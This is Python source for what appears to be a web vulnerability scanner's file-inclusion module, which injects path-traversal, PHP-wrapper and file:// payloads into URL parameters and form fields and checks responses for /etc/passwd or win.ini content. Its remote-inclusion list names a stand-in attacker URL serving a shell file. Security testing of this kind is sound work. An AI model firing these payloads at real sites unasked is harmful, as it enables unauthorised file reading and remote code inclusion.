"""File Inclusion (LFI/RFI) Detection Module."""

import re
from modules.base import BaseModule
from lib.logger import log


class FileIncludeModule(BaseModule):
    """Detect Local/Remote File Inclusion vulnerabilities."""

    name = "file_include"
    description = "LFI/RFI detection (path traversal, PHP wrappers, remote inclusion)"

    LFI_PAYLOADS = [
        ("../../../etc/passwd", "root:"),
        ("....//....//....//etc/passwd", "root:"),
        ("..%252f..%252f..%252fetc/passwd", "root:"),
        ("/etc/passwd", "root:"),
        ("C:\\windows\\win.ini", "\[fonts\]"),
        ("..\\..\\..\\windows\\win.ini", "\[fonts\]"),
        ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "root:"),
        ("php://filter/convert.base64-encode/resource=/etc/passwd", "cm9vd"),
        ("php://filter/convert.base64-encode/resource=index.php", "PD9"),
        ("file:///etc/passwd", "root:"),
    ]

    RFI_PAYLOADS = [
        ("http://evil.com/shell.txt", None),
        ("https://httpbin.org/get", "headers"),
    ]

    def run(self, param_urls, forms):
        """Run file inclusion detection."""
        for url in param_urls:
            params = self.get_params(url)
            for param in params:
                self._test_lfi(url, param)
                self._test_rfi(url, param)

        for form in forms:
            self._test_form_lfi(form)

        return self.findings

    def _test_lfi(self, url, param):
        """Test for Local File Inclusion."""
        for payload, indicator in self.LFI_PAYLOADS:
            self.delay()
            test_url = self.inject_param(url, param, payload)
            try:
                resp = self.client.get(test_url)
                if resp.status_code == 200 and indicator and indicator in resp.text:
                    self.add_finding(
                        "lfi", url, param, "critical",
                        f"LFI indicator found: {indicator}",
                        payload, "Local File Inclusion vulnerability"
                    )

                    if self.ai and self.ai.enabled:
                        analysis = self.ai.analyze_vulnerability(
                            "file_inclusion", url, param, {"payload": payload}, resp.text[:1000]
                        )
                        self.findings[-1].ai_analysis = analysis
                    return
            except Exception:
                pass

    def _test_rfi(self, url, param):
        """Test for Remote File Inclusion."""
        for payload, _ in self.RFI_PAYLOADS:
            self.delay()
            test_url = self.inject_param(url, param, payload)
            try:
                resp = self.client.get(test_url)
                # RFI is harder to confirm - check for content from remote URL
                if resp.status_code == 200 and len(resp.text) > 100:
                    # Check if response contains content from the remote URL
                    if "httpbin" in payload and "headers" in resp.text:
                        self.add_finding(
                            "rfi", url, param, "critical",
                            "Remote file inclusion confirmed",
                            payload, "Remote File Inclusion vulnerability"
                        )
                        return
            except Exception:
                pass

    def _test_form_lfi(self, form):
        """Test form inputs for LFI."""
        action = form["action"]
        method = form["method"]
        inputs = form["inputs"]

        for inp in inputs:
            if inp["type"] in ("submit", "button", "hidden", "file"):
                continue

            for payload, indicator in self.LFI_PAYLOADS[:5]:
                self.delay()
                data = {}
                for field in inputs:
                    data[field["name"]] = payload if field["name"] == inp["name"] else field.get("value", "test")

                try:
                    if method == "POST":
                        resp = self.client.post(action, data=data)
                    else:
                        resp = self.client.get(action, params=data)

                    if indicator and indicator in resp.text:
                        self.add_finding(
                            "lfi", action, inp["name"], "critical",
                            f"LFI in form field",
                            payload, "Local File Inclusion via form"
                        )
                        return
                except Exception:
                    pass
